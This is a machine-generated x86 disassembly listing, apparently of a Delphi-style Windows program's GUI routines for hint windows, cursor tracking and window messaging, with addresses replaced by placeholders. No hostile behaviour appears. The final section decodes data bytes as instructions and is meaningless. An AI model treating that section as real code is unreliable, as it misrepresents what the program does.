movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_4609d8
test al al
je r-xdata
call sub_446be4
mov ebp eax
mov eax edi
call sub_446be4
mov ebp eax
mov eax esi
call sub_4609d8
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_46049c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4604f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4609d8
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_461224
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4604fb
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_460504
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46055c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4609d8
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_461224
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460563
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_460574
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_40324c
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_440564
jmp r-xdata
sub_4605c4
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45dac8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_446be4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45dab4
mov ebx eax
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov eax ebx
call sub_446be4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_460628
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43ec70
mov edi eax
call sub_43d56c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_441578
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_441578
sub_4606a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4607b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_460628
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45e630
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43d528
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_460860
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_460757
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_460bf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4605c4
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41fa38
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4607b7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_4607c0
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45daac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45da98
movzx edx di
xor ecx ecx
call sub_441578
inc esi
dec ebx
jne r-xdata
sub_4607fc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45f870
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45f870
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_4607c0
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_460860
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4043a8
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403ff0
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439fd4
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44cea0
xor eax eax
push ebp
push sub_4608e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_4608f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_460950
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45daac
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4608f4
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45da98
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4608f4
pop ecx
jmp r-xdata
mov eax ebx
call sub_446ee8
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_446be4
push eax
call IsChild
test eax eax
jne r-xdata
sub_4609d8
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4059cc
call sub_42b4d4
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_460a00
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_460a44
push sub_45e688
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_460bf8
sub_460a6c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406d48
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43fedc
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43ec70
call sub_45e668
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_460bf8
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406d48
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43fedc
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_460bf8
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_460a00
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_441578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_460e90
jmp r-xdata
sub_460b7c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_460a44
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_460e90
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_460bb4
jmp r-xdata
sub_460bb4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_446ee8
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_446be4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_446be4
push eax
call ShowWindow
sub_460bf8
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_460bb4
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45e7f0
mov eax ebx
call sub_460a44
sub_460c30
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_460d72
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_425108
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407ee0
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_460d43
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4251c0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460d4a
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4027d4
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_460c20
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_460c20
mov [ ebp - 0x4 ] eax
sub_460d4a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_460d84
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_40324c
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403194
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_460de4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_460e7e
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460e85
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40408c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_423cc8
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c564
mov ebx eax
inc ebx
sub_460e90
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404934
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_461216
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_460bf8
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_460a00
jmp r-xdata
call sub_457020
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46121d
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a04
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43ec70
call sub_45e668
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_460c30
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45da2c
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43fd64
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43ff08
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45e630
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43d4e4
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404034
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_441578
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_460d84
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403448
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43fedc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43fedc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_440564
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45e77c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_460de4
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_460a00
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_460a00
jmp r-xdata
sub_461224
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403ff0
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403ff0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_461260
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_441578
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_441578
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44cd68
sub_4612f0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_461318
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_4613c8
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46141f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461426
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_456dcc
mov eax sub_45704c
call sub_419d6c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_461715
inc ebx
add [ ebx + 0x1 ] ah
add bh bh
clc
js r-xdata
add [ eax ] eax
[ ecx + edi * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
add bh bh
sbb [ eax ] al
insb
adc eax 0x65420a00
jbe r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
retn
insd
adc [ eax ] al
sub al 0x2
add bh bh
jo r-xdata
inc ebx
jb r-xdata
add [ gs : eax ] dl
xor eax [ esp + eax * 4 - 0x53 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
call sub_465bbb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
push esp
inc ebp
add [ edx + eax ] ah
add bh bh
add al 0x8d
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebx
outsd
insb
jne r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001a ] al
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
and [ ebx + eax * 2 + 0x9b00 ] dh
[ ebx + 0x1ff0000 ]
outsb
jae r-xdata
inc esi
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec ebp
outsd
sbb eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc esp
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x24ff0001 ] ah
insd
inc esp
add [ eax + 0x6d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001b ] al
je r-xdata
